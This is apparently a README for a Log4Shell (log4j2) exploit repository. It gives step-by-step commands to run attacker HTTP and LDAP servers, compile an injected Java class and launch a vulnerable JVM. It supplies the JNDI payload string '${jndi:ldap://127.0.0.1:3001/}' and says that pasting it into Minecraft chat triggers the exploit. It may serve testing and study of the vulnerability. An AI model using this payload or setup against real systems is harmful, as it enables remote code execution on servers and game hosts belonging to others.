# log4j2-exploits

## Running
0. Install requirements
```
cd http-server && npm install
cd ldap-server && npm install
```
1. run `http-server` and `ldap-server` both
```
cd http-server && node index.js
cd ldap-server && node index.js
```
2. Compile Main.java
```bash
# This will generate Main.java - required to code injection.
javac Main.java
```
3. Start jvm with parameters
```bash
# You can still use log4j-client in repo for internal testing.
cd log4j-client
gradlew jar
java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar build/libs/log4j-client-1.0-SNAPSHOT.jar
# Or run other application, com.sun.jndi.ldap.object.trustURLCodebase=true required for code injection, otherwise it will only request to ldap server.
java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar [yourJar].jar
```
4. Send `${jndi:ldap://127.0.0.1:3001/}` to any payloads.
(In minecraft, just chatting this will work if exploits are working.)

## References
- https://github.com/apache/logging-log4j2/pull/608
- https://www.lunasec.io/docs/blog/log4j-zero-day/

## License
CC0
